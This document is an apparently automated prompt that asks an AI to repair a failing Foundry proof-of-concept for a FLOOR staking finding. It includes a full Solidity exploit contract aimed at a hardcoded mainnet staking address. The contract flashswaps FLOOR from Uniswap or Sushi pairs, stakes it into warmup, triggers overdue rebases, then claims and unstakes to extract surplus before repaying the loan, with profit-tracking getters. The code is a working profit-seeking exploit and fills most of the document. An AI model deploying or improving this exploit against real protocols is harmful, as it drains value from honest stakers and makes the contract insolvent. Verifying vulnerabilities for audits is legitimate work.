You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Warmup deposits are rebased but never counted as liabilities, allowing staking insolvency
- claim: `stake()` transfers FLOOR into the contract and records warmup positions as `deposit` plus `gons`, while `claim()` later pays `sFLOOR.balanceForGons(info.gons)`, so warmup balances continue to appreciate with rebases. However, `rebase()` computes distributable surplus from `FLOOR.balanceOf(address(this)) - sFLOOR.circulatingSupply() - bounty` and never subtracts `gonsInWarmup` or `supplyInWarmup()`. Warmup-backed FLOOR is therefore treated as free excess reserves and redistributed to current stakers even though it is still owed to warmup claimants.
- impact: Large warmup balances can make the system undercollateralized. After one or more rebases, the contract can owe more sFLOOR/gFLOOR/FLOOR than it holds backing for, causing honest claimants or unstakers to receive unbacked positions or hit `unstake()` reverts due to insufficient FLOOR reserves.
- exploit_paths: ["Set `warmupPeriod > 0` and let some users already hold active staking positions.", "A user stakes FLOOR into warmup, increasing `gonsInWarmup` but not `sFLOOR.circulatingSupply()`.", "When `rebase()` runs, the newly deposited FLOOR is included in `balance` and treated as surplus because warmup liabilities are not subtracted.", "Existing stakers receive that value through rebases, while the warmup user still retains a claim for `sFLOOR.balanceForGons(info.gons)`.", "Total redeemable claims eventually exceed the contract's FLOOR backing, and withdrawals start failing."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IsFLOORLike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
    function balanceForGons(uint256 gons) external view returns (uint256);
}

interface IgFLOORLike is IERC20Like {
    function balanceFrom(uint256 amount) external view returns (uint256);
}

interface IStakingLike {
    function FLOOR() external view returns (address);
    function sFLOOR() external view returns (address);
    function gFLOOR() external view returns (address);

    function warmupPeriod() external view returns (uint256);
    function supplyInWarmup() external view returns (uint256);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function warmupInfo(address account)
        external
        view
        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);

    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
    function claim(address to, bool rebasing) external returns (uint256);
    function forfeit() external returns (uint256);
    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
    function rebase() external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    struct Claim {
        uint256 deposit;
        uint256 gons;
        uint256 expiry;
        bool lock;
    }

    struct FlashQuote {
        address pair;
        uint256 amountOut;
        bool floorIsToken0;
    }

    IStakingLike internal constant STAKING =
        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bool private baselineCaptured;
    uint256 private baselineEquityInFloor;
    uint256 private realizedProfitInFloor;
    address private activeFlashPair;

    constructor() {}

    function executeOnOpportunity() public {
        _captureBaseline();
        _approveSpenders();

        if (!_canExploitCurrentEpochState()) {
            _syncProfit();
            return;
        }

        uint256 localFloor = _floor().balanceOf(address(this));
        if (localFloor != 0) {
            _runWarmupExploit(localFloor);
            _syncProfit();
            return;
        }

        FlashQuote memory quote = _bestFlashQuote();
        if (quote.pair == address(0) || quote.amountOut == 0) {
            _syncProfit();
            return;
        }

        activeFlashPair = quote.pair;
        IUniswapV2PairLike(quote.pair).swap(
            quote.floorIsToken0 ? quote.amountOut : 0,
            quote.floorIsToken0 ? 0 : quote.amountOut,
            address(this),
            abi.encode(quote.amountOut)
        );
        activeFlashPair = address(0);

        _syncProfit();
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activeFlashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed != 0, "no FLOOR borrowed");

        _runWarmupExploit(borrowed);

        uint256 repayment = _v2Repayment(borrowed);
        _floor().transfer(msg.sender, repayment);
    }

    function profitToken() external view returns (address) {
        return STAKING.FLOOR();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitInFloor;
    }

    function _runWarmupExploit(uint256 floorToStake) internal {
        if (floorToStake == 0) {
            return;
        }

        uint256 preWarmupSupply = STAKING.supplyInWarmup();

        // The finding is the same core bug even when warmupPeriod == 0:
        // stake(..., claimNow=false) still records a warmup liability, and with at
        // least two overdue epochs the next rebase occurs while that liability is
        // excluded from circulatingSupply().
        STAKING.stake(address(this), floorToStake, true, false);

        Claim memory info = _warmupInfo();
        if (info.gons == 0) {
            return;
        }

        if (STAKING.supplyInWarmup() <= preWarmupSupply) {
            return;
        }

        _consumeImmediateRebases();

        info = _warmupInfo();
        if (info.gons == 0) {
            return;
        }

        uint256 claimableSFloor = _sFloor().balanceForGons(info.gons);
        if (claimableSFloor == 0) {
            return;
        }

        try STAKING.claim(address(this), true) returns (uint256) {
            _approveSpenders();
            _realizeClaimedSFloor(claimableSFloor);
        } catch {
            // If the warmup position cannot be claimed, leave state untouched rather
            // than manufacturing balances. This PoC only uses public on-chain flows.
        }
    }

    function _canExploitCurrentEpochState() internal view returns (bool) {
        if (_sFloor().circulatingSupply() == 0) {
            return false;
        }

        uint256 remaining = _remainingImmediateRebases();
        uint256 warmupPeriod = STAKING.warmupPeriod();
        uint256 required = warmupPeriod == 0 ? 2 : warmupPeriod + 1;
        return remaining >= required;
    }

    function _bestFlashQuote() internal view returns (FlashQuote memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];
        address floorToken = STAKING.FLOOR();

        uint256 softCap = _sFloor().circulatingSupply();

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(floorToken, bases[j]);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
                address token0 = v2Pair.token0();
                (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();

                uint256 floorReserve = token0 == floorToken ? uint256(reserve0) : uint256(reserve1);
                if (floorReserve <= 1000) {
                    continue;
                }

                uint256 amountOut = (floorReserve * 90) / 100;
                if (softCap != 0 && amountOut > softCap) {
                    amountOut = softCap;
                }

                if (amountOut > best.amountOut) {
                    best = FlashQuote({
                        pair: pair,
                        amountOut: amountOut,
                        floorIsToken0: token0 == floorToken
                    });
                }
            }
        }
    }

    function _captureBaseline() internal {
        if (baselineCaptured) {
            return;
        }

        baselineCaptured = true;
        baselineEquityInFloor = _currentEquityInFloor();
    }

    function _consumeImmediateRebases() internal {
        for (uint256 i = 0; i < 64; ++i) {
            if (!_epochReady()) {
                break;
            }
            STAKING.rebase();
        }
    }

    function _realizeClaimedSFloor(uint256 maxAmount) internal {
        uint256 sBalance = _sFloor().balanceOf(address(this));
        if (sBalance == 0) {
            return;
        }

        uint256 reserves = _floor().balanceOf(address(STAKING));
        if (reserves == 0) {
            return;
        }

        uint256 amount = sBalance;
        if (amount > maxAmount) {
            amount = maxAmount;
        }
        if (amount > reserves) {
            amount = reserves;
        }
        if (amount == 0) {
            return;
        }

        try STAKING.unstake(address(this), amount, _epochReady(), true) returns (uint256) {
            return;
        } catch {}

        try STAKING.unstake(address(this), amount, false, true) returns (uint256) {
            return;
        } catch {}
    }

    function _approveSpenders() internal {
        _floor().approve(address(STAKING), type(uint256).max);
        _sFloor().approve(address(STAKING), type(uint256).max);
    }

    function _warmupInfo() internal view returns (Claim memory info) {
        (info.deposit, info.gons, info.expiry, info.lock) = STAKING.warmupInfo(address(this));
    }

    function _currentEquityInFloor() internal view returns (uint256 equity) {
        equity = _floor().balanceOf(address(this));
        equity += _sFloor().balanceOf(address(this));

        uint256 gBalance = _gFloor().balanceOf(address(this));
        if (gBalance != 0) {
            equity += _gFloor().balanceFrom(gBalance);
        }

        Claim memory info = _warmupInfo();
        if (info.gons != 0) {
            equity += _sFloor().balanceForGons(info.gons);
        }
    }

    function _remainingImmediateRebases() internal view returns (uint256) {
        (uint256 length,, uint256 end,) = STAKING.epoch();
        if (length == 0 || end > block.timestamp) {
            return 0;
        }

        return ((block.timestamp - end) / length) + 1;
    }

    function _epochReady() internal view returns (bool) {
        (, , uint256 end,) = STAKING.epoch();
        return end <= block.timestamp;
    }

    function _v2Repayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _floor() internal view returns (IERC20Like) {
        return IERC20Like(STAKING.FLOOR());
    }

    function _sFloor() internal view returns (IsFLOORLike) {
        return IsFLOORLike(STAKING.sFLOOR());
    }

    function _gFloor() internal view returns (IgFLOORLike) {
        return IgFLOORLike(STAKING.gFLOOR());
    }

    function _syncProfit() internal {
        uint256 currentFloorBalance = _floor().balanceOf(address(this));
        if (currentFloorBalance > baselineEquityInFloor) {
            realizedProfitInFloor = currentFloorBalance - baselineEquityInFloor;
        } else {
            realizedProfitInFloor = 0;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: warmupperiod > 0, gonsinwarmup, sfloor.circulatingsupply(), sfloor.balanceforgons(info.gons), withdraw; generated code does not cover paths indexes: 0, 1, 3, 4
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
